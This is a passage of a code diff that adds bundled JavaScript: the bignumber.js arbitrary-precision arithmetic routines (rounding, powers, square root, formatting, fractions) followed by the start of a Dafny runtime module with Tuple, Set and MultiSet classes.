+            for (d2 = 1; k >= 10; k /= 10, d2++) ;
+            i %= LOG_BASE;
+            j = i - LOG_BASE + d2;
+            rd = j < 0 ? 0 : mathfloor(n / pows10[d2 - j - 1] % 10);
+          }
+        }
+        r = r || sd < 0 || // Are there any non-zero digits after the rounding digit?
+        // The expression  n % pows10[d - j - 1]  returns all digits of n to the right
+        // of the digit at j, e.g. if n is 908714 and j is 2, the expression gives 714.
+        xc[ni + 1] != null || (j < 0 ? n : n % pows10[d2 - j - 1]);
+        r = rm2 < 4 ? (rd || r) && (rm2 == 0 || rm2 == (x.s < 0 ? 3 : 2)) : rd > 5 || rd == 5 && (rm2 == 4 || r || rm2 == 6 && // Check whether the digit to the left of the rounding digit is odd.
+        (i > 0 ? j > 0 ? n / pows10[d2 - j] : 0 : xc[ni - 1]) % 10 & 1 || rm2 == (x.s < 0 ? 8 : 7));
+        if (sd < 1 || !xc[0]) {
+          xc.length = 0;
+          if (r) {
+            sd -= x.e + 1;
+            xc[0] = pows10[(LOG_BASE - sd % LOG_BASE) % LOG_BASE];
+            x.e = -sd || 0;
+          } else {
+            xc[0] = x.e = 0;
+          }
+          return x;
+        }
+        if (i == 0) {
+          xc.length = ni;
+          k = 1;
+          ni--;
+        } else {
+          xc.length = ni + 1;
+          k = pows10[LOG_BASE - i];
+          xc[ni] = j > 0 ? mathfloor(n / pows10[d2 - j] % pows10[j]) * k : 0;
+        }
+        if (r) {
+          for (; ; ) {
+            if (ni == 0) {
+              for (i = 1, j = xc[0]; j >= 10; j /= 10, i++) ;
+              j = xc[0] += k;
+              for (k = 1; j >= 10; j /= 10, k++) ;
+              if (i != k) {
+                x.e++;
+                if (xc[0] == BASE) xc[0] = 1;
+              }
+              break;
+            } else {
+              xc[ni] += k;
+              if (xc[ni] != BASE) break;
+              xc[ni--] = 0;
+              k = 1;
+            }
+          }
+        }
+        for (i = xc.length; xc[--i] === 0; xc.pop()) ;
+      }
+      if (x.e > MAX_EXP) {
+        x.c = x.e = null;
+      } else if (x.e < MIN_EXP) {
+        x.c = [x.e = 0];
+      }
+    }
+    return x;
+  }
+  function valueOf(n) {
+    var str2, e = n.e;
+    if (e === null) return n.toString();
+    str2 = coeffToString(n.c);
+    str2 = e <= TO_EXP_NEG || e >= TO_EXP_POS ? toExponential(str2, e) : toFixedPoint(str2, e, "0");
+    return n.s < 0 ? "-" + str2 : str2;
+  }
+  P2.absoluteValue = P2.abs = function() {
+    var x = new BigNumber2(this);
+    if (x.s < 0) x.s = 1;
+    return x;
+  };
+  P2.comparedTo = function(y, b) {
+    return compare(this, new BigNumber2(y, b));
+  };
+  P2.decimalPlaces = P2.dp = function(dp, rm2) {
+    var c2, n, v, x = this;
+    if (dp != null) {
+      intCheck(dp, 0, MAX);
+      if (rm2 == null) rm2 = ROUNDING_MODE;
+      else intCheck(rm2, 0, 8);
+      return round2(new BigNumber2(x), dp + x.e + 1, rm2);
+    }
+    if (!(c2 = x.c)) return null;
+    n = ((v = c2.length - 1) - bitFloor(this.e / LOG_BASE)) * LOG_BASE;
+    if (v = c2[v]) for (; v % 10 == 0; v /= 10, n--) ;
+    if (n < 0) n = 0;
+    return n;
+  };
+  P2.dividedBy = P2.div = function(y, b) {
+    return div(this, new BigNumber2(y, b), DECIMAL_PLACES, ROUNDING_MODE);
+  };
+  P2.dividedToIntegerBy = P2.idiv = function(y, b) {
+    return div(this, new BigNumber2(y, b), 0, 1);
+  };
+  P2.exponentiatedBy = P2.pow = function(n, m) {
+    var half, isModExp, i, k, more, nIsBig, nIsNeg, nIsOdd, y, x = this;
+    n = new BigNumber2(n);
+    if (n.c && !n.isInteger()) {
+      throw Error(bignumberError + "Exponent not an integer: " + valueOf(n));
+    }
+    if (m != null) m = new BigNumber2(m);
+    nIsBig = n.e > 14;
+    if (!x.c || !x.c[0] || x.c[0] == 1 && !x.e && x.c.length == 1 || !n.c || !n.c[0]) {
+      y = new BigNumber2(Math.pow(+valueOf(x), nIsBig ? n.s * (2 - isOdd(n)) : +valueOf(n)));
+      return m ? y.mod(m) : y;
+    }
+    nIsNeg = n.s < 0;
+    if (m) {
+      if (m.c ? !m.c[0] : !m.s) return new BigNumber2(NaN);
+      isModExp = !nIsNeg && x.isInteger() && m.isInteger();
+      if (isModExp) x = x.mod(m);
+    } else if (n.e > 9 && (x.e > 0 || x.e < -1 || (x.e == 0 ? x.c[0] > 1 || nIsBig && x.c[1] >= 24e7 : x.c[0] < 8e13 || nIsBig && x.c[0] <= 9999975e7))) {
+      k = x.s < 0 && isOdd(n) ? -0 : 0;
+      if (x.e > -1) k = 1 / k;
+      return new BigNumber2(nIsNeg ? 1 / k : k);
+    } else if (POW_PRECISION) {
+      k = mathceil(POW_PRECISION / LOG_BASE + 2);
+    }
+    if (nIsBig) {
+      half = new BigNumber2(0.5);
+      if (nIsNeg) n.s = 1;
+      nIsOdd = isOdd(n);
+    } else {
+      i = Math.abs(+valueOf(n));
+      nIsOdd = i % 2;
+    }
+    y = new BigNumber2(ONE);
+    for (; ; ) {
+      if (nIsOdd) {
+        y = y.times(x);
+        if (!y.c) break;
+        if (k) {
+          if (y.c.length > k) y.c.length = k;
+        } else if (isModExp) {
+          y = y.mod(m);
+        }
+      }
+      if (i) {
+        i = mathfloor(i / 2);
+        if (i === 0) break;
+        nIsOdd = i % 2;
+      } else {
+        n = n.times(half);
+        round2(n, n.e + 1, 1);
+        if (n.e > 14) {
+          nIsOdd = isOdd(n);
+        } else {
+          i = +valueOf(n);
+          if (i === 0) break;
+          nIsOdd = i % 2;
+        }
+      }
+      x = x.times(x);
+      if (k) {
+        if (x.c && x.c.length > k) x.c.length = k;
+      } else if (isModExp) {
+        x = x.mod(m);
+      }
+    }
+    if (isModExp) return y;
+    if (nIsNeg) y = ONE.div(y);
+    return m ? y.mod(m) : k ? round2(y, POW_PRECISION, ROUNDING_MODE, more) : y;
+  };
+  P2.integerValue = function(rm2) {
+    var n = new BigNumber2(this);
+    if (rm2 == null) rm2 = ROUNDING_MODE;
+    else intCheck(rm2, 0, 8);
+    return round2(n, n.e + 1, rm2);
+  };
+  P2.isEqualTo = P2.eq = function(y, b) {
+    return compare(this, new BigNumber2(y, b)) === 0;
+  };
+  P2.isFinite = function() {
+    return !!this.c;
+  };
+  P2.isGreaterThan = P2.gt = function(y, b) {
+    return compare(this, new BigNumber2(y, b)) > 0;
+  };
+  P2.isGreaterThanOrEqualTo = P2.gte = function(y, b) {
+    return (b = compare(this, new BigNumber2(y, b))) === 1 || b === 0;
+  };
+  P2.isInteger = function() {
+    return !!this.c && bitFloor(this.e / LOG_BASE) > this.c.length - 2;
+  };
+  P2.isLessThan = P2.lt = function(y, b) {
+    return compare(this, new BigNumber2(y, b)) < 0;
+  };
+  P2.isLessThanOrEqualTo = P2.lte = function(y, b) {
+    return (b = compare(this, new BigNumber2(y, b))) === -1 || b === 0;
+  };
+  P2.isNaN = function() {
+    return !this.s;
+  };
+  P2.isNegative = function() {
+    return this.s < 0;
+  };
+  P2.isPositive = function() {
+    return this.s > 0;
+  };
+  P2.isZero = function() {
+    return !!this.c && this.c[0] == 0;
+  };
+  P2.minus = function(y, b) {
+    var i, j, t, xLTy, x = this, a = x.s;
+    y = new BigNumber2(y, b);
+    b = y.s;
+    if (!a || !b) return new BigNumber2(NaN);
+    if (a != b) {
+      y.s = -b;
+      return x.plus(y);
+    }
+    var xe = x.e / LOG_BASE, ye = y.e / LOG_BASE, xc = x.c, yc = y.c;
+    if (!xe || !ye) {
+      if (!xc || !yc) return xc ? (y.s = -b, y) : new BigNumber2(yc ? x : NaN);
+      if (!xc[0] || !yc[0]) {
+        return yc[0] ? (y.s = -b, y) : new BigNumber2(xc[0] ? x : (
+          // IEEE 754 (2008) 6.3: n - n = -0 when rounding to -Infinity
+          ROUNDING_MODE == 3 ? -0 : 0
+        ));
+      }
+    }
+    xe = bitFloor(xe);
+    ye = bitFloor(ye);
+    xc = xc.slice();
+    if (a = xe - ye) {
+      if (xLTy = a < 0) {
+        a = -a;
+        t = xc;
+      } else {
+        ye = xe;
+        t = yc;
+      }
+      t.reverse();
+      for (b = a; b--; t.push(0)) ;
+      t.reverse();
+    } else {
+      j = (xLTy = (a = xc.length) < (b = yc.length)) ? a : b;
+      for (a = b = 0; b < j; b++) {
+        if (xc[b] != yc[b]) {
+          xLTy = xc[b] < yc[b];
+          break;
+        }
+      }
+    }
+    if (xLTy) {
+      t = xc;
+      xc = yc;
+      yc = t;
+      y.s = -y.s;
+    }
+    b = (j = yc.length) - (i = xc.length);
+    if (b > 0) for (; b--; xc[i++] = 0) ;
+    b = BASE - 1;
+    for (; j > a; ) {
+      if (xc[--j] < yc[j]) {
+        for (i = j; i && !xc[--i]; xc[i] = b) ;
+        --xc[i];
+        xc[j] += BASE;
+      }
+      xc[j] -= yc[j];
+    }
+    for (; xc[0] == 0; xc.splice(0, 1), --ye) ;
+    if (!xc[0]) {
+      y.s = ROUNDING_MODE == 3 ? -1 : 1;
+      y.c = [y.e = 0];
+      return y;
+    }
+    return normalise(y, xc, ye);
+  };
+  P2.modulo = P2.mod = function(y, b) {
+    var q, s, x = this;
+    y = new BigNumber2(y, b);
+    if (!x.c || !y.s || y.c && !y.c[0]) {
+      return new BigNumber2(NaN);
+    } else if (!y.c || x.c && !x.c[0]) {
+      return new BigNumber2(x);
+    }
+    if (MODULO_MODE == 9) {
+      s = y.s;
+      y.s = 1;
+      q = div(x, y, 0, 3);
+      y.s = s;
+      q.s *= s;
+    } else {
+      q = div(x, y, 0, MODULO_MODE);
+    }
+    y = x.minus(q.times(y));
+    if (!y.c[0] && MODULO_MODE == 1) y.s = x.s;
+    return y;
+  };
+  P2.multipliedBy = P2.times = function(y, b) {
+    var c2, e, i, j, k, m, xcL, xlo, xhi, ycL, ylo, yhi, zc, base2, sqrtBase, x = this, xc = x.c, yc = (y = new BigNumber2(y, b)).c;
+    if (!xc || !yc || !xc[0] || !yc[0]) {
+      if (!x.s || !y.s || xc && !xc[0] && !yc || yc && !yc[0] && !xc) {
+        y.c = y.e = y.s = null;
+      } else {
+        y.s *= x.s;
+        if (!xc || !yc) {
+          y.c = y.e = null;
+        } else {
+          y.c = [0];
+          y.e = 0;
+        }
+      }
+      return y;
+    }
+    e = bitFloor(x.e / LOG_BASE) + bitFloor(y.e / LOG_BASE);
+    y.s *= x.s;
+    xcL = xc.length;
+    ycL = yc.length;
+    if (xcL < ycL) {
+      zc = xc;
+      xc = yc;
+      yc = zc;
+      i = xcL;
+      xcL = ycL;
+      ycL = i;
+    }
+    for (i = xcL + ycL, zc = []; i--; zc.push(0)) ;
+    base2 = BASE;
+    sqrtBase = SQRT_BASE;
+    for (i = ycL; --i >= 0; ) {
+      c2 = 0;
+      ylo = yc[i] % sqrtBase;
+      yhi = yc[i] / sqrtBase | 0;
+      for (k = xcL, j = i + k; j > i; ) {
+        xlo = xc[--k] % sqrtBase;
+        xhi = xc[k] / sqrtBase | 0;
+        m = yhi * xlo + xhi * ylo;
+        xlo = ylo * xlo + m % sqrtBase * sqrtBase + zc[j] + c2;
+        c2 = (xlo / base2 | 0) + (m / sqrtBase | 0) + yhi * xhi;
+        zc[j--] = xlo % base2;
+      }
+      zc[j] = c2;
+    }
+    if (c2) {
+      ++e;
+    } else {
+      zc.splice(0, 1);
+    }
+    return normalise(y, zc, e);
+  };
+  P2.negated = function() {
+    var x = new BigNumber2(this);
+    x.s = -x.s || null;
+    return x;
+  };
+  P2.plus = function(y, b) {
+    var t, x = this, a = x.s;
+    y = new BigNumber2(y, b);
+    b = y.s;
+    if (!a || !b) return new BigNumber2(NaN);
+    if (a != b) {
+      y.s = -b;
+      return x.minus(y);
+    }
+    var xe = x.e / LOG_BASE, ye = y.e / LOG_BASE, xc = x.c, yc = y.c;
+    if (!xe || !ye) {
+      if (!xc || !yc) return new BigNumber2(a / 0);
+      if (!xc[0] || !yc[0]) return yc[0] ? y : new BigNumber2(xc[0] ? x : a * 0);
+    }
+    xe = bitFloor(xe);
+    ye = bitFloor(ye);
+    xc = xc.slice();
+    if (a = xe - ye) {
+      if (a > 0) {
+        ye = xe;
+        t = yc;
+      } else {
+        a = -a;
+        t = xc;
+      }
+      t.reverse();
+      for (; a--; t.push(0)) ;
+      t.reverse();
+    }
+    a = xc.length;
+    b = yc.length;
+    if (a - b < 0) {
+      t = yc;
+      yc = xc;
+      xc = t;
+      b = a;
+    }
+    for (a = 0; b; ) {
+      a = (xc[--b] = xc[b] + yc[b] + a) / BASE | 0;
+      xc[b] = BASE === xc[b] ? 0 : xc[b] % BASE;
+    }
+    if (a) {
+      xc = [a].concat(xc);
+      ++ye;
+    }
+    return normalise(y, xc, ye);
+  };
+  P2.precision = P2.sd = function(sd, rm2) {
+    var c2, n, v, x = this;
+    if (sd != null && sd !== !!sd) {
+      intCheck(sd, 1, MAX);
+      if (rm2 == null) rm2 = ROUNDING_MODE;
+      else intCheck(rm2, 0, 8);
+      return round2(new BigNumber2(x), sd, rm2);
+    }
+    if (!(c2 = x.c)) return null;
+    v = c2.length - 1;
+    n = v * LOG_BASE + 1;
+    if (v = c2[v]) {
+      for (; v % 10 == 0; v /= 10, n--) ;
+      for (v = c2[0]; v >= 10; v /= 10, n++) ;
+    }
+    if (sd && x.e + 1 > n) n = x.e + 1;
+    return n;
+  };
+  P2.shiftedBy = function(k) {
+    intCheck(k, -MAX_SAFE_INTEGER, MAX_SAFE_INTEGER);
+    return this.times("1e" + k);
+  };
+  P2.squareRoot = P2.sqrt = function() {
+    var m, n, r, rep, t, x = this, c2 = x.c, s = x.s, e = x.e, dp = DECIMAL_PLACES + 4, half = new BigNumber2("0.5");
+    if (s !== 1 || !c2 || !c2[0]) {
+      return new BigNumber2(!s || s < 0 && (!c2 || c2[0]) ? NaN : c2 ? x : 1 / 0);
+    }
+    s = Math.sqrt(+valueOf(x));
+    if (s == 0 || s == 1 / 0) {
+      n = coeffToString(c2);
+      if ((n.length + e) % 2 == 0) n += "0";
+      s = Math.sqrt(+n);
+      e = bitFloor((e + 1) / 2) - (e < 0 || e % 2);
+      if (s == 1 / 0) {
+        n = "5e" + e;
+      } else {
+        n = s.toExponential();
+        n = n.slice(0, n.indexOf("e") + 1) + e;
+      }
+      r = new BigNumber2(n);
+    } else {
+      r = new BigNumber2(s + "");
+    }
+    if (r.c[0]) {
+      e = r.e;
+      s = e + dp;
+      if (s < 3) s = 0;
+      for (; ; ) {
+        t = r;
+        r = half.times(t.plus(div(x, t, dp, 1)));
+        if (coeffToString(t.c).slice(0, s) === (n = coeffToString(r.c)).slice(0, s)) {
+          if (r.e < e) --s;
+          n = n.slice(s - 3, s + 1);
+          if (n == "9999" || !rep && n == "4999") {
+            if (!rep) {
+              round2(t, t.e + DECIMAL_PLACES + 2, 0);
+              if (t.times(t).eq(x)) {
+                r = t;
+                break;
+              }
+            }
+            dp += 4;
+            s += 4;
+            rep = 1;
+          } else {
+            if (!+n || !+n.slice(1) && n.charAt(0) == "5") {
+              round2(r, r.e + DECIMAL_PLACES + 2, 1);
+              m = !r.times(r).eq(x);
+            }
+            break;
+          }
+        }
+      }
+    }
+    return round2(r, r.e + DECIMAL_PLACES + 1, ROUNDING_MODE, m);
+  };
+  P2.toExponential = function(dp, rm2) {
+    if (dp != null) {
+      intCheck(dp, 0, MAX);
+      dp++;
+    }
+    return format3(this, dp, rm2, 1);
+  };
+  P2.toFixed = function(dp, rm2) {
+    if (dp != null) {
+      intCheck(dp, 0, MAX);
+      dp = dp + this.e + 1;
+    }
+    return format3(this, dp, rm2);
+  };
+  P2.toFormat = function(dp, rm2, format4) {
+    var str2, x = this;
+    if (format4 == null) {
+      if (dp != null && rm2 && typeof rm2 == "object") {
+        format4 = rm2;
+        rm2 = null;
+      } else if (dp && typeof dp == "object") {
+        format4 = dp;
+        dp = rm2 = null;
+      } else {
+        format4 = FORMAT;
+      }
+    } else if (typeof format4 != "object") {
+      throw Error(bignumberError + "Argument not an object: " + format4);
+    }
+    str2 = x.toFixed(dp, rm2);
+    if (x.c) {
+      var i, arr = str2.split("."), g1 = +format4.groupSize, g2 = +format4.secondaryGroupSize, groupSeparator = format4.groupSeparator || "", intPart = arr[0], fractionPart = arr[1], isNeg = x.s < 0, intDigits = isNeg ? intPart.slice(1) : intPart, len = intDigits.length;
+      if (g2) {
+        i = g1;
+        g1 = g2;
+        g2 = i;
+        len -= i;
+      }
+      if (g1 > 0 && len > 0) {
+        i = len % g1 || g1;
+        intPart = intDigits.substr(0, i);
+        for (; i < len; i += g1) intPart += groupSeparator + intDigits.substr(i, g1);
+        if (g2 > 0) intPart += groupSeparator + intDigits.slice(i);
+        if (isNeg) intPart = "-" + intPart;
+      }
+      str2 = fractionPart ? intPart + (format4.decimalSeparator || "") + ((g2 = +format4.fractionGroupSize) ? fractionPart.replace(
+        new RegExp("\\d{" + g2 + "}\\B", "g"),
+        "$&" + (format4.fractionGroupSeparator || "")
+      ) : fractionPart) : intPart;
+    }
+    return (format4.prefix || "") + str2 + (format4.suffix || "");
+  };
+  P2.toFraction = function(md) {
+    var d2, d0, d1, d22, e, exp, n, n0, n1, q, r, s, x = this, xc = x.c;
+    if (md != null) {
+      n = new BigNumber2(md);
+      if (!n.isInteger() && (n.c || n.s !== 1) || n.lt(ONE)) {
+        throw Error(bignumberError + "Argument " + (n.isInteger() ? "out of range: " : "not an integer: ") + valueOf(n));
+      }
+    }
+    if (!xc) return new BigNumber2(x);
+    d2 = new BigNumber2(ONE);
+    n1 = d0 = new BigNumber2(ONE);
+    d1 = n0 = new BigNumber2(ONE);
+    s = coeffToString(xc);
+    e = d2.e = s.length - x.e - 1;
+    d2.c[0] = POWS_TEN[(exp = e % LOG_BASE) < 0 ? LOG_BASE + exp : exp];
+    md = !md || n.comparedTo(d2) > 0 ? e > 0 ? d2 : n1 : n;
+    exp = MAX_EXP;
+    MAX_EXP = 1 / 0;
+    n = new BigNumber2(s);
+    n0.c[0] = 0;
+    for (; ; ) {
+      q = div(n, d2, 0, 1);
+      d22 = d0.plus(q.times(d1));
+      if (d22.comparedTo(md) == 1) break;
+      d0 = d1;
+      d1 = d22;
+      n1 = n0.plus(q.times(d22 = n1));
+      n0 = d22;
+      d2 = n.minus(q.times(d22 = d2));
+      n = d22;
+    }
+    d22 = div(md.minus(d0), d1, 0, 1);
+    n0 = n0.plus(d22.times(n1));
+    d0 = d0.plus(d22.times(d1));
+    n0.s = n1.s = x.s;
+    e = e * 2;
+    r = div(n1, d1, e, ROUNDING_MODE).minus(x).abs().comparedTo(
+      div(n0, d0, e, ROUNDING_MODE).minus(x).abs()
+    ) < 1 ? [n1, d1] : [n0, d0];
+    MAX_EXP = exp;
+    return r;
+  };
+  P2.toNumber = function() {
+    return +valueOf(this);
+  };
+  P2.toPrecision = function(sd, rm2) {
+    if (sd != null) intCheck(sd, 1, MAX);
+    return format3(this, sd, rm2, 2);
+  };
+  P2.toString = function(b) {
+    var str2, n = this, s = n.s, e = n.e;
+    if (e === null) {
+      if (s) {
+        str2 = "Infinity";
+        if (s < 0) str2 = "-" + str2;
+      } else {
+        str2 = "NaN";
+      }
+    } else {
+      if (b == null) {
+        str2 = e <= TO_EXP_NEG || e >= TO_EXP_POS ? toExponential(coeffToString(n.c), e) : toFixedPoint(coeffToString(n.c), e, "0");
+      } else if (b === 10 && alphabetHasNormalDecimalDigits) {
+        n = round2(new BigNumber2(n), DECIMAL_PLACES + e + 1, ROUNDING_MODE);
+        str2 = toFixedPoint(coeffToString(n.c), n.e, "0");
+      } else {
+        intCheck(b, 2, ALPHABET.length, "Base");
+        str2 = convertBase(toFixedPoint(coeffToString(n.c), e, "0"), 10, b, s, true);
+      }
+      if (s < 0 && n.c[0]) str2 = "-" + str2;
+    }
+    return str2;
+  };
+  P2.valueOf = P2.toJSON = function() {
+    return valueOf(this);
+  };
+  P2._isBigNumber = true;
+  P2[Symbol.toStringTag] = "BigNumber";
+  P2[/* @__PURE__ */ Symbol.for("nodejs.util.inspect.custom")] = P2.valueOf;
+  if (configObject != null) BigNumber2.set(configObject);
+  return BigNumber2;
+}
+function bitFloor(n) {
+  var i = n | 0;
+  return n > 0 || n === i ? i : i - 1;
+}
+function coeffToString(a) {
+  var s, z, i = 1, j = a.length, r = a[0] + "";
+  for (; i < j; ) {
+    s = a[i++] + "";
+    z = LOG_BASE - s.length;
+    for (; z--; s = "0" + s) ;
+    r += s;
+  }
+  for (j = r.length; r.charCodeAt(--j) === 48; ) ;
+  return r.slice(0, j + 1 || 1);
+}
+function compare(x, y) {
+  var a, b, xc = x.c, yc = y.c, i = x.s, j = y.s, k = x.e, l = y.e;
+  if (!i || !j) return null;
+  a = xc && !xc[0];
+  b = yc && !yc[0];
+  if (a || b) return a ? b ? 0 : -j : i;
+  if (i != j) return i;
+  a = i < 0;
+  b = k == l;
+  if (!xc || !yc) return b ? 0 : !xc ^ a ? 1 : -1;
+  if (!b) return k > l ^ a ? 1 : -1;
+  j = (k = xc.length) < (l = yc.length) ? k : l;
+  for (i = 0; i < j; i++) if (xc[i] != yc[i]) return xc[i] > yc[i] ^ a ? 1 : -1;
+  return k == l ? 0 : k > l ^ a ? 1 : -1;
+}
+function intCheck(n, min, max2, name) {
+  if (n < min || n > max2 || n !== mathfloor(n)) {
+    throw Error(bignumberError + (name || "Argument") + (typeof n == "number" ? n < min || n > max2 ? " out of range: " : " not an integer: " : " not a primitive number: ") + String(n));
+  }
+}
+function isOdd(n) {
+  var k = n.c.length - 1;
+  return bitFloor(n.e / LOG_BASE) == k && n.c[k] % 2 != 0;
+}
+function toExponential(str2, e) {
+  return (str2.length > 1 ? str2.charAt(0) + "." + str2.slice(1) : str2) + (e < 0 ? "e" : "e+") + e;
+}
+function toFixedPoint(str2, e, z) {
+  var len, zs;
+  if (e < 0) {
+    for (zs = z + "."; ++e; zs += z) ;
+    str2 = zs + str2;
+  } else {
+    len = str2.length;
+    if (++e > len) {
+      for (zs = z, e -= len; --e; zs += z) ;
+      str2 += zs;
+    } else if (e < len) {
+      str2 = str2.slice(0, e) + "." + str2.slice(e);
+    }
+  }
+  return str2;
+}
+var BigNumber = clone();
+
+// src/formal/generated/kernel.ts
+BigNumber.config({ MODULO_MODE: BigNumber.EUCLID });
+var _dafny = (function() {
+  let $module = {};
+  $module.areEqual = function(a, b) {
+    if (typeof a === "string" && b instanceof _dafny.Seq) {
+      return b.equals(a);
+    } else if (typeof a === "number" && BigNumber.isBigNumber(b)) {
+      return b.isEqualTo(a);
+    } else if (typeof a !== "object" || a === null || b === null) {
+      return a === b;
+    } else if (BigNumber.isBigNumber(a)) {
+      return a.isEqualTo(b);
+    } else if (a._tname !== void 0 || Array.isArray(a) && a.constructor.name == "Array") {
+      return a === b;
+    } else {
+      return a.equals(b);
+    }
+  };
+  $module.toString = function(a) {
+    if (a === null) {
+      return "null";
+    } else if (typeof a === "number") {
+      return a.toFixed();
+    } else if (BigNumber.isBigNumber(a)) {
+      return a.toFixed();
+    } else if (a._tname !== void 0) {
+      return a._tname;
+    } else {
+      return a.toString();
+    }
+  };
+  $module.escapeCharacter = function(cp) {
+    let s = String.fromCodePoint(cp.value);
+    switch (s) {
+      case "\n":
+        return "\\n";
+      case "\r":
+        return "\\r";
+      case "	":
+        return "\\t";
+      case "\0":
+        return "\\0";
+      case "'":
+        return "\\'";
+      case '"':
+        return '\\"';
+      case "\\":
+        return "\\\\";
+      default:
+        return s;
+    }
+    ;
+  };
+  $module.NewObject = function() {
+    return { _tname: "object" };
+  };
+  $module.InstanceOfTrait = function(obj, trait) {
+    return obj._parentTraits !== void 0 && obj._parentTraits().includes(trait);
+  };
+  $module.Rtd_bool = class {
+    static get Default() {
+      return false;
+    }
+  };
+  $module.Rtd_char = class {
+    static get Default() {
+      return "D";
+    }
+    // See CharType.DefaultValue in Dafny source code
+  };
+  $module.Rtd_codepoint = class {
+    static get Default() {
+      return new _dafny.CodePoint("D".codePointAt(0));
+    }
+  };
+  $module.Rtd_int = class {
+    static get Default() {
+      return BigNumber(0);
+    }
+  };
+  $module.Rtd_number = class {
+    static get Default() {
+      return 0;
+    }
+  };
+  $module.Rtd_ref = class {
+    static get Default() {
+      return null;
+    }
+  };
+  $module.Rtd_array = class {
+    static get Default() {
+      return [];
+    }
+  };
+  $module.ZERO = new BigNumber(0);
+  $module.ONE = new BigNumber(1);
+  $module.NUMBER_LIMIT = new BigNumber(32).multipliedBy(281474976710656);
+  $module.Tuple = class Tuple extends Array {
+    constructor(...elems) {
+      super(...elems);
+    }
+    toString() {
+      return "(" + arrayElementsToString(this) + ")";
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      }
+      for (let i = 0; i < this.length; i++) {
+        if (!_dafny.areEqual(this[i], other[i])) {
+          return false;
+        }
+      }
+      return true;
+    }
+    static Default(...values2) {
+      return Tuple.of(...values2);
+    }
+    static Rtd(...rtdArgs) {
+      return {
+        Default: Tuple.from(rtdArgs, (rtd) => rtd.Default)
+      };
+    }
+  };
+  $module.Set = class Set2 extends Array {
+    constructor() {
+      super();
+    }
+    static get Default() {
+      return Set2.Empty;
+    }
+    toString() {
+      return "{" + arrayElementsToString(this) + "}";
+    }
+    static get Empty() {
+      if (this._empty === void 0) {
+        this._empty = new Set2();
+      }
+      return this._empty;
+    }
+    static fromElements(...elmts) {
+      let s = new Set2();
+      for (let k of elmts) {
+        s.add(k);
+      }
+      return s;
+    }
+    contains(k) {
+      for (let i = 0; i < this.length; i++) {
+        if (_dafny.areEqual(this[i], k)) {
+          return true;
+        }
+      }
+      return false;
+    }
+    add(k) {
+      if (!this.contains(k)) {
+        this.push(k);
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.length !== other.length) {
+        return false;
+      }
+      for (let e of this) {
+        if (!other.contains(e)) {
+          return false;
+        }
+      }
+      return true;
+    }
+    get Elements() {
+      return this;
+    }
+    Union(that) {
+      if (this.length === 0) {
+        return that;
+      } else if (that.length === 0) {
+        return this;
+      } else {
+        let s = Set2.of(...this);
+        for (let k of that) {
+          s.add(k);
+        }
+        return s;
+      }
+    }
+    Intersect(that) {
+      if (this.length === 0) {
+        return this;
+      } else if (that.length === 0) {
+        return that;
+      } else {
+        let s = new Set2();
+        for (let k of this) {
+          if (that.contains(k)) {
+            s.push(k);
+          }
+        }
+        return s;
+      }
+    }
+    Difference(that) {
+      if (this.length == 0 || that.length == 0) {
+        return this;
+      } else {
+        let s = new Set2();
+        for (let k of this) {
+          if (!that.contains(k)) {
+            s.push(k);
+          }
+        }
+        return s;
+      }
+    }
+    IsDisjointFrom(that) {
+      for (let k of this) {
+        if (that.contains(k)) {
+          return false;
+        }
+      }
+      return true;
+    }
+    IsSubsetOf(that) {
+      if (that.length < this.length) {
+        return false;
+      }
+      for (let k of this) {
+        if (!that.contains(k)) {
+          return false;
+        }
+      }
+      return true;
+    }
+    IsProperSubsetOf(that) {
+      if (that.length <= this.length) {
+        return false;
+      }
+      for (let k of this) {
+        if (!that.contains(k)) {
+          return false;
+        }
+      }
+      return true;
+    }
+    get AllSubsets() {
+      return this.AllSubsets_();
+    }
+    *AllSubsets_() {
+      let elmts = Array.of(...this);
+      let n = elmts.length;
+      let which = new Array(n);
+      which.fill(false);
+      let a = [];
+      while (true) {
+        yield Set2.of(...a);
+        let i = 0;
+        for (; i < n && which[i]; i++) {
+          which[i] = false;
+          for (let j = 0; j < a.length; j++) {
+            if (_dafny.areEqual(a[j], elmts[i])) {
+              a[j] = a[-1];
+              a.pop();
+              break;
+            }
+          }
+        }
+        if (i === n) {
+          break;
+        }
+        which[i] = true;
+        a.push(elmts[i]);
+      }
+    }
+  };
+  $module.MultiSet = class MultiSet extends Array {
+    constructor() {
+      super();
+    }
+    static get Default() {
+      return MultiSet.Empty;
+    }
+    toString() {
+      let s = "multiset{";
+      let sep3 = "";
+      for (let e of this) {
+        let [k, n] = e;
+        let ks = _dafny.toString(k);
+        while (!n.isZero()) {
+          n = n.minus(1);
+          s += sep3 + ks;
+          sep3 = ", ";
+        }
+      }
+      s += "}";
+      return s;
+    }
+    static get Empty() {
+      if (this._empty === void 0) {
+        this._empty = new MultiSet();
+      }
+      return this._empty;
+    }
+    static fromElements(...elmts) {
+      let s = new MultiSet();
+      for (let e of elmts) {
+        s.add(e, _dafny.ONE);
+      }
+      return s;
+    }
+    static FromArray(arr) {
+      let s = new MultiSet();
+      for (let e of arr) {
+        s.add(e, _dafny.ONE);
+      }
+      return s;
+    }
+    cardinality() {
+      let c2 = _dafny.ZERO;
+      for (let e of this) {
+        let [k, n] = e;
+        c2 = c2.plus(n);
+      }
+      return c2;
+    }
+    clone() {
+      let s = new MultiSet();
+      for (let e of this) {
+        let [k, n] = e;
+        s.push([k, n]);
+      }
+      return s;
+    }
+    findIndex(k) {
+      for (let i = 0; i < this.length; i++) {
+        if (_dafny.areEqual(this[i][0], k)) {
+          return i;
+        }
+      }
+      return this.length;
+    }
+    get(k) {
+      let i = this.findIndex(k);
+      if (i === this.length) {
+        return _dafny.ZERO;
+      } else {
+        return this[i][1];
+      }
+    }
+    contains(k) {
+      return !this.get(k).isZero();
+    }
+    add(k, n) {
+      let i = this.findIndex(k);
+      if (i === this.length) {
+        this.push([k, n]);
+      } else {
+        let m = this[i][1];
+        this[i] = [k, m.plus(n)];
+      }
+    }
+    update(k, n) {
+      let i = this.findIndex(k);
+      if (i < this.length && this[i][1].isEqualTo(n)) {
+        return this;
+      } else if (i === this.length && n.isZero()) {
+        return this;
+      } else if (i === this.length) {
+        let m = this.slice();
+        m.push([k, n]);
+        return m;
+      } else {
+        let m = this.slice();
+        m[i] = [k, n];
+        return m;
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      }
+      for (let e of this) {
+        let [k, n] = e;
